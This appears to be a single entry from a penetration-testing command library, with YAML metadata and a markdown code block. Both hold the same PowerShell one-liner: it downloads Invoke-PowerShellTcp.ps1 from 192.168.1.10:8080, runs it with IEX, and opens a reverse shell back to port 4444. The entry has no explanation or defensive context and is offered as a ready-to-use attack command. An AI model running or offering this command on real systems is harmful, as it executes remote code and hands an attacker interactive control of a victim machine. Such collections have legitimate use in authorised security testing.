---
id: 59bc98e2-0728-47e5-858b-8d77cbd6e521
name: Powershell Reverse shell
type: command
executor: bash
data: 'IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.10:8080/tools/ps/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp
  -Reverse -IPAddress 192.168.1.10 -Port 4444

  '
output: null
created_at: '2020-07-15T19:05:45.532120+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Powershell Reverse shell

```bash
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.10 -Port 4444

```
